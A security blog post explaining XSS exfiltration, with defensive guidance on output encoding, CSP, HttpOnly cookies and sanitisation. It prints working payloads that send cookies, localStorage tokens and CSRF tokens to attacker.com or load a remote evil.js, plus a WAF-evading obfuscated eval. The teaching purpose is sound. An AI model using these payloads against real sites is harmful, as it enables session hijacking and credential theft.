# XSS Exfiltration: How Attackers Steal Data Using JavaScript

> **Author**: Redfox Security
> **Published**: Feb 10, 2026

---

![Redfox Security](https://miro.medium.com/v2/resize:fill:32:32/1*Lz-ETmy_ABdAxYf2wqqxMA.png)

7

Listen

Share

![Illustration of a hacker exfiltrating data from a web browser using malicious scripts, representing XSS attacks and data theft.](https://miro.medium.com/v2/resize:fit:700/1*-PBTyyu8won1ISShdp4rFw.png)

In the realm of web application security, one vulnerability continues to haunt developers and delight attackers — Cross-Site Scripting, commonly known as XSS. It’s not just a theoretical threat. When leveraged skillfully, an XSS vulnerability can lead to data exfiltration, session hijacking, unauthorized actions on behalf of a user, and more.

This blog explores how attackers use XSS payloads to silently exfiltrate sensitive information from a user’s browser, walking you through the mechanics, methods, examples, and defensive strategies.

## What Is XSS?

Cross-Site Scripting (XSS) is a type of client-side injection attack where an attacker injects malicious JavaScript code into a legitimate website. When other users visit the infected page, the malicious code runs in their browser within the context of the site.

There are three main types of XSS:

- Reflected XSS — Payload is reflected from the request (e.g., query string) into the response.
- Stored (Persistent) XSS — Payload is stored in the database and served to users.
- DOM-Based XSS — The vulnerability exists in the frontend JavaScript code manipulating the DOM.

When successful, an XSS vulnerability allows attackers to interact with the page on behalf of the victim, including accessing cookies, localStorage, DOM elements, and even initiating requests.

## What Is XSS Exfiltration?

XSS exfiltration is the process of using an XSS attack to steal or leak sensitive data from the victim’s browser to an external server controlled by the attacker.

Think of it this way: XSS is the break-in, and exfiltration is the theft.

Once the attacker injects a malicious XSS payload, they can instruct the victim’s browser to collect data and send it to a remote server using JavaScript methods like:

- etch()
- XMLHttpRequest
- <img src=””>
- navigator.sendBeacon()
- <script src=””> (for blind XSS)
- DNS queries (advanced blind techniques)

## What Can Be Exfiltrated?

Depending on the access level, the attacker can exfiltrate:

- Session cookies (if not HttpOnly)
- LocalStorage and SessionStorage data
- CSRF tokens
- Form inputs (username, email, password)
- Keystrokes (via event listeners)
- DOM content
- Screenshot data (via canvas)
- Browser fingerprinting data
- Authentication tokens or JWTs

## Example Of An XSS Payload For Exfiltration

Here’s a simple but powerful XSS payload that exfiltrates the user’s cookie:

```
<script>
  new Image().src = "https://attacker.com/log?cookie=" + document.cookie;
</script>
```

The browser requests the image from the attacker’s server, sending the cookie as a parameter. This method works well because image tags don’t trigger CORS errors and do not require a successful load.

## Advanced Example: Fetching LocalStorage and Sending It

```
<script>
  const data = localStorage.getItem('auth_token');
  fetch('https://attacker.com/collect', {
    method: 'POST',
    body: JSON.stringify({ token: data }),
    headers: { 'Content-Type': 'application/json' }
  });
</script>
```

This payload captures a token stored in the browser’s localStorage and sends it via a POST request to the attacker’s endpoint.

## Using Burp Collaborator oOr Blind Channels

In a blind XSS scenario, the attacker might not get an immediate response. They could inject a payload that triggers later (e.g., in an admin dashboard). For such situations, Burp Collaborator or a custom DNS/HTTP listener can be used.

## Get Redfox Security’s stories in your inbox

Join Medium for free to get updates from this writer.

Remember me for faster sign in

Example payload:

```
<script src="https://collaborator.net/evil.js"></script>
```

When the admin loads a comment or feedback form, the external script gets executed even if the attacker never sees the page directly.

## Real-World Scenario: Exfiltrating CSRF Tokens

Let’s say a banking site stores CSRF tokens in the page or in a hidden form field. The attacker uses this payload:

```
<script>
  const token = document.querySelector('input[name="csrf_token"]').value;
  fetch('https://attacker.com/token', {
    method: 'POST',
    body: token
  });
</script>
```

With the CSRF token, the attacker can now perform unauthorized actions like money transfers if CSRF protections are bypassed.

## Bypassing Basic Protections

Most modern frameworks escape HTML by default, but real-world apps often introduce vulnerabilities via:

- Unescaped input in innerHTML
- User-generated content in JavaScript variables
- Unsafe DOM manipulations (.innerHTML, .document.write)
- Poorly configured WYSIWYG editors
- Legacy pages or forgotten features

A well-crafted XSS payload can bypass weak filters using obfuscation:

```
<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>
```

This runs alert(1) but hides the intent from basic WAFs.

## Defensive Strategies To Prevent XSS Exfiltration

Protecting against XSS vulnerabilities requires multiple layers of defense:

### 1. Output Encoding

Always encode user-supplied input before rendering it in HTML, JavaScript, or attributes.

### 2. Use Content Security Policy (CSP)

A strong CSP header blocks inline scripts and prevents requests to untrusted domains.

Example:

```
Content-Security-Policy: default-src 'self'; script-src 'self'; object-src 'none';
```

### 3. Set HttpOnly on Cookies

This prevents JavaScript from accessing session cookies.

```
Set-Cookie: sessionid=xyz; HttpOnly; Secure; SameSite=Strict
```

### 4. Validate and Sanitize Input

Use libraries like DOMPurify to clean up user inputs before rendering.

### 5. Avoid Dangerous APIs

Avoid innerHTML, document.write, and eval() unless absolutely necessary.

### 6. Use Secure JavaScript Frameworks

Modern frameworks like React and Angular escape HTML automatically unless bypassed via dangerous patterns.

## Testing For XSS Vulnerabilities

When performing penetration testing or bug bounty hunting, here are tools to help detect XSS vulnerabilities and validate exfiltration:

- Burp Suite (Pro or Community)
- XSStrike
- XSS Hunter / Hunter Premium
- Dalfox
- OWASP ZAP
- Manual JavaScript injection tests

Also try payloads like:

```
<img src=x onerror="document.location='https://attacker.com?c='+document.cookie">
```

Or even using onmouseover, onload, or onfocus events for stealthy triggers.

## Conclusion

XSS exfiltration is a high-impact attack vector that demonstrates how dangerous a seemingly small XSS vulnerability can become in real-world scenarios. Once an attacker executes JavaScript in a victim’s browser, it opens the door to silent data theft, account takeover, and lateral movement.

Developers must take this threat seriously by implementing robust encoding, secure headers, safe APIs, and automated security testing.

On the other hand, security researchers and red teamers continue to innovate XSS payloads that push the boundaries of what’s possible — from stealing credentials to triggering webcam access via browser APIs (with permissions).

Understanding the mechanics of XSS exfiltration is essential whether you’re defending, attacking, or auditing modern web applications.



---
*Original URL: [https://medium.com/@redfoxsecurity/xss-exfiltration-how-attackers-steal-data-using-javascript-d63a9d92b74f?source=search_post---------57-----------------------------------](https://medium.com/@redfoxsecurity/xss-exfiltration-how-attackers-steal-data-using-javascript-d63a9d92b74f?source=search_post---------57-----------------------------------)*
